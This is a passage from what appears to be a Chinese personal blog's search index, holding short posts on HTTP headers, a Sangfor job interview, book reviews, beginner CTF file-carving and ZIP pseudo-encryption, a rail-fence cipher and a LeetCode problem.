/></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-Forwarded-For和Referer</title>
      <link href="/2020/02/21/X-Forwarded-For%E5%92%8CReferer/"/>
      <url>/2020/02/21/X-Forwarded-For%E5%92%8CReferer/</url>
      
        <content type="html"><![CDATA[<h1 id="1-x-forwarded-for"><a class="markdownIt-Anchor" href="#1-x-forwarded-for"></a> 1 X-Forwarded-For</h1><p><strong>简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。</strong></p><ul><li>表示HTTP包的源IP，包括起始IP和路径上经过的代理IP</li><li>标准格式如下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: client1, proxy1, proxy2</span><br></pre></td></tr></table></figure><p><strong>从标准格式可以看出，X-Forwarded-For头信息可以有多个，中间用逗号分隔，第一项为真实的客户端ip，剩下的就是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个。</strong></p><h1 id="2-referer"><a class="markdownIt-Anchor" href="#2-referer"></a> 2 Referer</h1><ul><li>当从一个页面跳转到另一个页面时，用Referer来表示是从哪个页面跳转过来的。</li><li>当一个请求并不是由链接触发产生的，那么不需要指定这个请求的链接来源。比如，直接在浏览器的地址栏中输入一个资源的URL地址，那么这种请求是不会包含 Referer  字段的，因为这是一个“凭空产生”的 HTTP  请求，并不是从一个地方链接过去的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记深信服2018秋季校园招聘-技术服务工程师</title>
      <link href="/2020/02/21/%E8%AE%B0%E6%B7%B1%E4%BF%A1%E6%9C%8D2018%E7%A7%8B%E5%AD%A3%E6%A0%A1%E5%9B%AD%E6%8B%9B%E8%81%98-%E6%8A%80%E6%9C%AF%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88/"/>
      <url>/2020/02/21/%E8%AE%B0%E6%B7%B1%E4%BF%A1%E6%9C%8D2018%E7%A7%8B%E5%AD%A3%E6%A0%A1%E5%9B%AD%E6%8B%9B%E8%81%98-%E6%8A%80%E6%9C%AF%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88/</url>
      
        <content type="html"><![CDATA[<p>笔者本科就读于山东某一本院校，考研期间闲来无事，在2018年9月23日-24两天参加并通过了深信服的校园招聘，所投岗位是技术服务工程师。</p><h2 id="1-笔试"><a class="markdownIt-Anchor" href="#1-笔试"></a> 1 笔试</h2><p>因为之前参加了深信服的比赛拿了绿卡，所以免除了笔试环节。不过听说深信服的笔试题难度不小，但是刷人不多，基本都可以过。</p><h2 id="2-群面"><a class="markdownIt-Anchor" href="#2-群面"></a> 2 群面</h2><p>9.23日上午群面，9.30的场次一共十个人，分成两组，整个时间长度大约一个多小时。</p><p>首先轮流一分钟自我介绍，如果有什么比较拿得出手的东西，这个环节一定要说，让面试官和同学记住你；或者说一些能凸显自己的东西，最好不要生硬罗列自己获得过的奖项。</p><p>之后是每组分五个问题，包括人工智能的利弊、手机的利弊、读书的用处，精通一项技能好还是全部涉猎好等，基本是一些开放性的问题。选择一个问题，讨论自己的观点，讨论时间20分钟，然后选一个代表总结陈述。主要注意以下几点：讨论过程中一定要看好时间，不要在选题和选人总结上浪费时间；选题方面，建议不要选“怎么说都对”的问题（如手机的利弊，明显有利也有弊），所以我们组选的是“对读书无用论的看法”（显然读书有用）。讨论的时候，如果自己有想法要迅速提出来，一定不要等，不要不参与讨论，让组内成员觉得你有想法，在你占据了主导地位之后，整个组内讨论会顺着你的思路走下去。注意组内讨论问题的时候一定要和睦，大家是在解决问题，不要因为想过分表现自己就把别人当成宿敌，真正能凸显自己的是你是否承担了责任，是否提出了建设性意见，是否在组内发挥了重要作用等。在选人总结方面，如果觉得自己有能力就自荐，如果组内没人自荐那就自己来。当时我在选题的时候就有自己的看法，把马克思主义和“读书无用论”联系起来，认为后者是过分强调实践而否认认识的作用。在组内讨论的时候就比较独树一帜的把问题上升到理论高度，所以在选人总结的时候，组内成员都建议我来，虽然觉得自己可能不行，但是觉得推来推去结果会更坏，就硬着头皮上了。最后留出两分钟总结一下讨论的结果，大家会帮你一起梳理。总结的时候大胆自然，声音洪亮，清晰条理就足够了。双方在陈述完之后面试官会问一些问题，比如总结对方的观点，对对方观点的补充或不同意见，以及对某个具体点的提问等，这个时候也要主动，积极回答问题。最后是每个人推荐两个人晋级并阐述原因，面试官会进行参考，如果你在整个过程让同学们觉得你不错，自然会有很多人选你。</p><p>感觉群面还是比较难的，在非常短的时间内考察你与人协作、时间把控、问题分析、总结陈述、随机应变等各种能力。群面的目的还是个人综合能力和性格的考察。</p><h2 id="3-技术面"><a class="markdownIt-Anchor" href="#3-技术面"></a> 3 技术面</h2><p>群面完之后，过了一两个小时就电话通知下午技术面。技术面是与面试官一对一聊天，整个过程大约一个多小时。</p><p>主要形式是面试官一问一答的形式，主要内容包括技术和非技术两方面。<br />技术方面的问题不多也不难，包括：介绍OSPF，介绍MPLS VPN，介绍云计算、介绍SDN及其应用、OSPF区域0、静态路由的命令，0day等。主要是让你对整个协议进行简单介绍，很少涉及细节问题，只要大致的了解即可。</p><p>非技术问题一方面是面试官会根据简历上所写的项目和比赛经历问问题，比如会问你某个项目的过程，你在项目中担任的角色，承担的工作，整个项目对你来说有什么收获等。比赛方面会问你一些比赛的细节，包括比赛准备过程，参赛过程，以及参加比赛的收获等，甚至会让画出C4的拓扑图。另一方面会对你的认识观进行一些考察，比如会问我对学习有什么看法，当时我就想到了《魔鬼经济学》里关于学习的那一套理论，心中一喜，又是娓娓道来。还会问对与自己所投的这个岗位有什么认识，如何能把这个岗位的工作做好等。</p><p>整个技术面的过程对于技术的考察并不多，只需要大致了解并能简单叙述即可。更多的是面试官根据简历所写和你的回答一步一步的设问，整个过程基本都是自己在说。感觉这一轮面试其实没那么难，就像两个人聊天一样，把自己之前的经历、成果讲给面试官听，跟他交流你对一些问题的看法。</p><h2 id="4-hr面"><a class="markdownIt-Anchor" href="#4-hr面"></a> 4 HR面</h2><p>第二天上午HR面，基本就是考察你对公司的忠诚度，会不会来这家公司以及把公司情况介绍给你。</p><p>开始，HR问了我几个问题，包括大学最有成就的一件事，大学学习成绩，有没有想考研，家庭情况等等。更偏向于对个人信息的了解而不是能力的考察。然后HR向我介绍公司的发展情况、工作地点、工作状况、薪资待遇等，整个过程我也可以发问。大约30分钟左右结束。</p><h2 id="5-领取offer"><a class="markdownIt-Anchor" href="#5-领取offer"></a> 5 领取offer</h2><p>9.29日offer发放会<br />offer领取时HR会更详细的介绍公司的情况，然后整个市场和技服体系的会坐在一起，对关于入职和以后工作的问题大家一起提问，相对自由和随意。</p><h2 id="6-总结"><a class="markdownIt-Anchor" href="#6-总结"></a> 6 总结</h2><p>整个校招过程下来，收获颇丰。公司的招聘是对一个人硬实力和软实力的综合考量。这就要求我们在平时兼顾二者，一方面要保证大学内的学习成绩尽量优秀，对于专业知识和技术能力也要提高。在学好大学课程的同时，要多参加比赛和项目实习，要精通一门专业技能，培养自己的学习能力。另一方面在于个人的修养、见识、表达能力和协作能力等，培养自己的思维能力，在平时遇到问题多尝试与人交流，抓住公共场合发言的机会等。但一定不要信口开河，要言之有物。要多读书，不要仅限于专业书籍或者小说，需广泛涉猎，其实，整个面试过程其实并没有多少专业知识的考察，书读多了，自然会沉淀为知识，内化为力量，在遇到困难的时，变成那把随时可以抽出来披荆斩棘的剑。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书-《叫魂:1768年中国妖术大恐慌》</title>
      <link href="/2020/02/21/%E8%AF%BB%E4%B9%A6-%E3%80%8A%E5%8F%AB%E9%AD%82-1768%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%A6%96%E6%9C%AF%E5%A4%A7%E6%81%90%E6%85%8C%E3%80%8B/"/>
      <url>/2020/02/21/%E8%AF%BB%E4%B9%A6-%E3%80%8A%E5%8F%AB%E9%AD%82-1768%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%A6%96%E6%9C%AF%E5%A4%A7%E6%81%90%E6%85%8C%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p>1768年，即清乾隆三十三年，“叫魂”妖术在中国突然爆发，从中国最富庶的江南地区发端，沿着运河和长江北上西行，席卷了大半个中国。本书主要以君主、官僚和平民百姓三个方面为线索进行叙述，讨论了由这一事件所表现出来的种种社会、政治问题和历史意蕴。</p><p>于普通百姓层面，“叫魂”妖术所带来的，是对他们自身安全的威胁。虽然乾隆时代算得上是中国历史上的空前盛世，而且在当时最为富庶江南地区，经济的繁荣更是达到了顶峰。但就是在这样的“太平盛世”之下，贫富差距依然相当严重，位于最底层的劳苦大众，虽然可以不用再被征收劳动税和被迫服劳役，而是靠自己的一技之长（如每家每户的妇女儿童制作丝绸制品出售给商人）来糊口度日，但是他们所面临的竞争也越来越激烈。再加之当时的社会人民没有任何权利可言，而且极度迷信，所以当叫魂恐慌在他们之间散播开来时，他们敏感的神经又一次被绷紧，于是便疯狂的维护自己的利益，不仅使得叫魂恐慌蔓延，更使得整个社会动荡不安，甚至出现了暴民打死疑似叫魂者的乞丐乞僧的荒唐事件。这既是由于普通民众的愚昧和迷信，而更深层的原因，则是因为他们权利和生活得不到一点保障，而当跟他们同等级别甚至更低等地乞丐游僧疑似要威胁他们的生命安全时，所作出的激烈的本能反应。</p><p>于君主层面，弘历表面上看来，是担心民间的叫魂妖术，产生了与上天神灵的交流，而在当时这种特殊能力是只有君权神授的皇族才具有的。但更深层次上，弘历其实是担心叫魂恐慌会使社会动荡不安，因为它涉及到了满清政权最敏感的剃发问题，在叫魂案的背后，是否蕴藏着更深的政治阴谋，这是弘历最担心的问题。于是弘历便动员所有的官员对全国进行了一次妖术大清剿，最后却发现是一场闹剧，不过是官僚们陪弘历玩了一场游戏而已，这便是当时君主独裁制度最好的体现。但由此弘历也发现了中国官僚制度所存在的严重问题。</p><p>于官僚层面，一方面，他们要安抚不安的群众，另一方面，他们又要应付皇帝的种种要求。当民间的叫魂恐慌发生时，他们为了安抚大众，象征性的把嫌疑人抓起来，又怕影响自己的仕途，营造出一种地方太平无事的假象而不将案情上报。当弘历发现了各地的叫魂恐慌之后，降责于各地官员，命令他们迅速清剿叫魂疑犯。此时的官员们为了迎合君主，不惜错抓乱抓，诬陷良民，伪造案件，滥用私刑，使原本子虚乌有的事情更加荒唐，而位于京城的弘历像一个眼盲耳聋的人，对此一无所知。此二者足以看出当时官僚们的腐败无能，君主于官僚之间暗地里相互对抗，足以体现君主官僚制的局限和落后。</p><p>读此书之时，我们是否能联想到今天的社会？贫富差距依然巨大，愚民百姓依然存在，人民受教育水平和素质普遍偏低，而这不仅仅是经济发展就能令之有所改善的，当人们的权利和生活状况得不到保障时，人民紧绷的神经就会迫使自己在维护自己利益方面做出过激的反应。</p><p>政治方面，更不必多说。近年来，在中央领导人的努力下，贪污腐败的习气已经逐渐改善，这是我们乐意看到的。但是在中国，有很多官僚习气是很难改正的：欺上瞒下，靠关系办事，损人利己，只做表面工作，蔑视法制，无视公平和道德，诸如此类实难尽数，这不仅仅在官场政治中有所表现，在任何一个涉及权利和等级的场合都被体现的淋漓尽致。这是中华民族的劣根性所致？还是历史的余威仍在发挥作用，而我们需要更长的时间去改变？我们不得而知。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书 </tag>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书-《许三观卖血记》</title>
      <link href="/2020/02/21/%E8%AF%BB%E4%B9%A6-%E3%80%8A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0%E3%80%8B/"/>
      <url>/2020/02/21/%E8%AF%BB%E4%B9%A6-%E3%80%8A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p>作者以极其平淡朴实的语言，描绘了许三观一生的故事。书中几乎没有任何作者主观性的评论语言，而是完全通过对人物的描写来表达情感。</p><p>书中的许三观和许玉兰，是当时中国普普通通的市井小民，他们骂骂咧咧，斤斤计较，但是又有血有肉，有情有义。</p><p>读完此书，最让我动容的，并不是许三观为了帮助家庭度过难关一次次的去卖血，最后年老体衰，没人愿意买他血的悲凉。而是作者通过对许三观一生的描写，表现出来的真实的人性和真实的人生。</p><p>许三观第一次卖血来的钱，并不舍得给爷爷和四叔，但是后来他想起四叔的时候，竟然落泪了。</p><p>许三观在知道一乐不是自己儿子的时候，内心憋屈，不愿意给一乐买面条吃，可是当一乐患了肝炎的时候，他还是不惜一切一路卖血去上海给他看病。</p><p>许三观知道许玉兰跟何小勇有沾染，对许玉兰毫不留情面，可是在许玉兰挨批斗的时候，他还是天天去给自己的妻子送饭。</p><p>许玉兰平日里自己省吃俭用，好吃的都让给自己的丈夫和孩子，却从自己的嘴里省下钱来预备灾年。</p><p>许玉兰虽然一开始是不情愿的嫁给了许三观，生活中夫妻之间也有斤斤计较，但最后许三观因自己的血卖不出去而崩溃的时候，许玉兰搀扶着许三观来到饭店，点了三盘炒猪肝和黄酒，经过了岁月的洗礼之后，最疼爱许三观的人还是许玉兰。<br />…</p><p>他们都是一些在小事上斤斤计较，在大事上深明大义的人；是一些嘴上恶毒，内心柔软的人；是一些闲来无事诅咒你八辈祖宗，关键时刻会拉你一把的人。他们经历了时代的磨难和疼痛，但是他们从来不会抱怨生活，不会抱怨自己所热爱的东西。他们用无穷的信念勇敢的生活着。</p><p>此外，关于许三观和许玉兰之间的婚姻，是当时中国婚姻观和家庭观的典型代表，从我们父辈的身上也可以看到他们的影子。我觉得这其中也有我所认同的部分，许三观和许玉兰的婚姻，并不是源于浪漫的爱情，甚至有些被迫和无奈，但是从他们的身上，我却看到了责任和担当。反观现在，在恋爱和婚姻越来越自由的今天，为什么分手的人比比皆是？为什么离婚率越来越高？人们真的更加幸福了吗？我想不是的。人们越来越以自我为中心，正在一点点的失去信念、失去责任、失去人性。最伟大的爱情，不是一见钟情，更不是互相合适，而是历经磨难，共同品尝过生活的酸甜苦辣，经过岁月的洗礼之后所产生的，发自内心深处的爱，这种爱，笨拙但深沉。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书 </tag>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MISC中图片隐藏文件分离</title>
      <link href="/2020/02/21/MISC%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB/"/>
      <url>/2020/02/21/MISC%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="1-介绍"><a class="markdownIt-Anchor" href="#1-介绍"></a> 1 介绍</h1><p>在CTF的MISC中，经常会将flag隐藏在图片中。我们可以用Linux下的<kbd>binwalk</kbd>或者<kbd>foremost</kbd>进行图片文件的分离，这里我们选用分别介绍两种方法。<br />在Kali Linux上安装binwalk和foremost：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># apt-get install binwalk</span><br><span class="line"># apt-get install foremost</span><br></pre></td></tr></table></figure><p>题目中给出的图片如下图所示，图片名称为2.jpg，从图片中我们得不到任何信息：<br /><img src="https://img-blog.csdnimg.cn/20190928110721596.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h1 id="2-binwalk"><a class="markdownIt-Anchor" href="#2-binwalk"></a> 2 Binwalk</h1><h2 id="21-分析"><a class="markdownIt-Anchor" href="#21-分析"></a> 2.1 分析</h2><p>我们用binwalk分析图片的组成：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># binwalk 2.jpg</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190928111141504.png" alt="" /><br />从分析结果中我们可以看到，图片文件中隐藏了一个名为flag.txt的文件，而且是被压缩过的，其起始块是40078。</p><h2 id="22-分离"><a class="markdownIt-Anchor" href="#22-分离"></a> 2.2 分离</h2><p>我们使用<kbd>dd</kbd>命令分理出隐藏在图片中的.zip文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># dd if&#x3D;2.jpg of&#x3D;1.zip skip&#x3D;40078 bs&#x3D;1</span><br></pre></td></tr></table></figure><p>其中<kbd>if=2.jpg</kbd>是输入文件，<kbd>of=1.zip</kbd>是输出文件，<kbd>skip</kbd>是指定从输入文件开头跳过40078个块后再开始复制，<kbd>bs</kbd>设置每次读写块的大小为1字节 。<br /><img src="https://img-blog.csdnimg.cn/20190928113818481.png" alt="" /><br />然后我们将分离出来的1.zip解压，就可以看到flag：<br /><img src="https://img-blog.csdnimg.cn/20190928113940183.png" alt="" /></p><h1 id="2-foremost"><a class="markdownIt-Anchor" href="#2-foremost"></a> 2 Foremost</h1><p>利用以下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foremost 2.jpg</span><br></pre></td></tr></table></figure><p>可以直接将图片文件中包含的所有文件分离，输出到一个output文件夹中。打开这个文件夹，我们可以看到audit.txt为记录分离过程的文件，jpg为该图片文件中包含的所有.jpg文件，zip为该图片文件中包含的所有.zip文件。打开zip文件，并解压其中的00000078.zip，就可以得到flag。<br /><img src="https://img-blog.csdnimg.cn/20190928114216287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.zip格式和zip伪加密</title>
      <link href="/2020/02/21/zip%E6%A0%BC%E5%BC%8F%E5%92%8Czip%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2020/02/21/zip%E6%A0%BC%E5%BC%8F%E5%92%8Czip%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-zip文件的组成"><a class="markdownIt-Anchor" href="#1-zip文件的组成"></a> 1 ZIP文件的组成：</h1><ul><li><strong>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</strong></li></ul><h2 id="11-压缩源文件数据区"><a class="markdownIt-Anchor" href="#11-压缩源文件数据区"></a> 1.1 压缩源文件数据区</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">50 4B 03 04：这是头文件标记（0x04034b50）</span><br><span class="line"></span><br><span class="line">14 00：解压文件所需 pkware 版本</span><br><span class="line"></span><br><span class="line">00 00：全局方式位标记（有无加密）</span><br><span class="line"> </span><br><span class="line">08 00：压缩方式</span><br><span class="line"> </span><br><span class="line">5A 7E：最后修改文件时间</span><br><span class="line"> </span><br><span class="line">F7 46：最后修改文件日期</span><br><span class="line"></span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516）</span><br><span class="line"> </span><br><span class="line">19 00 00 00：压缩后尺寸（25）</span><br><span class="line"> </span><br><span class="line">17 00 00 00：未压缩尺寸（23）</span><br><span class="line"> </span><br><span class="line">07 00：文件名长度</span><br><span class="line"> </span><br><span class="line">00 00：扩展记录长度</span><br></pre></td></tr></table></figure><h2 id="12-压缩源文件目录区"><a class="markdownIt-Anchor" href="#12-压缩源文件目录区"></a> 1.2 压缩源文件目录区：</h2> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">50 4B 01 02：目录中文件文件头标记(0x02014b50)</span><br><span class="line"> </span><br><span class="line">3F 00：压缩使用的 pkware 版本</span><br><span class="line"> </span><br><span class="line">14 00：解压文件所需 pkware 版本</span><br><span class="line"> </span><br><span class="line">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class="line"> </span><br><span class="line">08 00：压缩方式</span><br><span class="line"></span><br><span class="line">5A 7E：最后修改文件时间</span><br><span class="line"></span><br><span class="line">F7 46：最后修改文件日期</span><br><span class="line"> </span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516）</span><br><span class="line"> </span><br><span class="line">19 00 00 00：压缩后尺寸（25）</span><br><span class="line"> </span><br><span class="line">17 00 00 00：未压缩尺寸（23）</span><br><span class="line"> </span><br><span class="line">07 00：文件名长度</span><br><span class="line"> </span><br><span class="line">24 00：扩展字段长度</span><br><span class="line"> </span><br><span class="line">00 00：文件注释长度</span><br><span class="line"></span><br><span class="line">00 00：磁盘开始号 </span><br><span class="line"></span><br><span class="line">00 00：内部文件属性</span><br><span class="line"></span><br><span class="line">20 00 00 00：外部文件属性</span><br><span class="line"></span><br><span class="line">00 00 00 00：局部头部偏移量</span><br></pre></td></tr></table></figure><h2 id="13-压缩源文件目录结束标志"><a class="markdownIt-Anchor" href="#13-压缩源文件目录结束标志"></a> 1.3 压缩源文件目录结束标志：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">50 4B 05 06：目录结束标记</span><br><span class="line"></span><br><span class="line">00 00：当前磁盘编号</span><br><span class="line"></span><br><span class="line">00 00：目录区开始磁盘编号</span><br><span class="line"> </span><br><span class="line">01 00：本磁盘上纪录总数</span><br><span class="line"></span><br><span class="line">01 00：目录区中纪录总数</span><br><span class="line"></span><br><span class="line">59 00 00 00：目录区尺寸大小</span><br><span class="line"> </span><br><span class="line">3E 00 00 00：目录区对第一张磁盘的偏移量</span><br><span class="line"></span><br><span class="line">00 00：ZIP 文件注释长度</span><br></pre></td></tr></table></figure><h1 id="2-示例"><a class="markdownIt-Anchor" href="#2-示例"></a> 2 示例</h1><p>1、自己简单做一个zip压缩包，正常的压缩，压缩包内有三个TXT文档。<br /><img src="https://img-blog.csdnimg.cn/20190928151453807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br />这时候的压缩包可以正常的解压，不用输入密码</p><p>2、将这个正常的压缩包放进winhex里面，看看的是什么效果<br /><img src="https://img-blog.csdnimg.cn/20190928151512681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><ul><li>第一个红框的地方是压缩源文件数据区：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">50 4B 03 04 是zip头文件标记；</span><br><span class="line"></span><br><span class="line">14 00 是解压文件所需要的PK版本；</span><br><span class="line"></span><br><span class="line">00 00 是全局方式标记（看是否加密，可以就看第一个00，第二字节00可以忽略。00表示无加密，01表示有加密。不过只要是偶数就是无加密，例如00,02,04等，奇数就是有加密，例如01,03,09等）</span><br></pre></td></tr></table></figure><ul><li>接下来的三个红框就是压缩文件目录区，分别为三个文件：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">50 4B 01 02 是目录中文件头标记</span><br><span class="line"></span><br><span class="line">14 00 压缩使用的 pkware 版本</span><br><span class="line"></span><br><span class="line">14 00 解压文件所需 pkware 版本 </span><br><span class="line"></span><br><span class="line"> 00 00 是全局方式标记（看是否加密，可以就看第一个00，第二字节00可以忽略。00表示无加密，01表示有加密。不过只要是偶数就是无加密，例如00,02,04等，奇数就是有加密，例如01,03,09等）</span><br></pre></td></tr></table></figure><ul><li>最后那个红框就是压缩源文件目录结束标志。</li></ul><p>接下来制作一个伪加密包</p><p>用winHex打开压缩包</p><p>修改如下数据，把1和2进行伪加密<br /><img src="https://img-blog.csdnimg.cn/2019092815163215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br />保存后打开压缩包<br /><img src="https://img-blog.csdnimg.cn/20190928151646796.png" alt="" /><br />发现1和2后面加上了一个星号，表示加密文件。</p><p>我们解压时，发现需要输入密码了。<br /><img src="https://img-blog.csdnimg.cn/20190928151700570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /><br />这就是伪密码了吧，若是遇到压缩包解压需要密码的时候先放在WinHEX中看看是不是伪加密，只要对比两部分的全局方式位标记，若第二部分是09 00，那就把09修改为00就好</p><p>或者<br />使用ZipCenOp去伪加密:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解密命令java -jar ZipCenOp.jar r xxxx.zip         </span><br><span class="line">加密命令java -jar ZipCenOp.jar e xxxx.zip</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栅栏密码</title>
      <link href="/2020/02/21/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81/"/>
      <url>/2020/02/21/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>CTF在线解密工具：<br /><a href="http://tool.bugku.com/jiemi/?wafcloud=1" target="_blank" rel="noopener">http://tool.bugku.com/jiemi/?wafcloud=1</a></p><ul><li>栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文。<br />这里以2栏栅栏（栏数为2）加密为例。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">明文：The quick brown fox jumps over the lazy dog</span><br><span class="line"></span><br><span class="line">去空格：Thequickbrownfoxjumpsoverthelazydog</span><br><span class="line"></span><br><span class="line">分组：Th eq ui ck br ow nf ox ju mp so ve rt he la zy do g</span><br><span class="line"></span><br><span class="line">第一组：Teucbonojmsvrhlzdg</span><br><span class="line"></span><br><span class="line">第二组：hqikrwfxupoeteayo</span><br><span class="line"></span><br><span class="line">密文：Teucbonojmsvrhlzdghqikrwfxupoeteayo</span><br></pre></td></tr></table></figure><ul><li>注：<br />如果不知道密文的栏数，可以用解密工具中的列举解密，可以列举出所有匹配栏数的解密方法</li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-70-爬楼梯</title>
      <link href="/2020/02/21/LeetCode-70-%E7%88%AC%E6%A5%BC%E6%A2%AF/"/>
      <url>/2020/02/21/LeetCode-70-%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="1-问题描述"><a class="markdownIt-Anchor" href="#1-问题描述"></a> 1 问题描述</h1><blockquote><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。<br />每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？<br />注意：给定 n 是一个正整数。</p></blockquote><h1 id="2-示例"><a class="markdownIt-Anchor" href="#2-示例"></a> 2 示例</h1><blockquote><p>示例1：<br />输入： 2<br />输出： 2<br />解释： 有两种方法可以爬到楼顶。<br />1: 1 阶 + 1 阶<br />2: 2 阶</p></blockquote><blockquote><p>示例 2：<br />输入： 3<br />输出： 3<br />解释： 有三种方法可以爬到楼顶。<br />1: 1 阶 + 1 阶 + 1 阶<br />2: 1 阶 + 2 阶<br />3: 2 阶 + 1 阶</p></blockquote><h1 id="3-解法"><a class="markdownIt-Anchor" href="#3-解法"></a> 3 解法</h1><h2 id="31-暴力破解"><a class="markdownIt-Anchor" href="#31-暴力破解"></a> 3.1 暴力破解</h2><ul><li>采用递归的方法：将会把所有可能爬的阶数进行组合，也就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>。而在每一步中我们都会继续调用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>i</mi><mi>m</mi><mi>b</mi><mi>S</mi><mi>t</mi><mi>a</mi><mi>i</mi><mi>r</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">climbStairs</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" 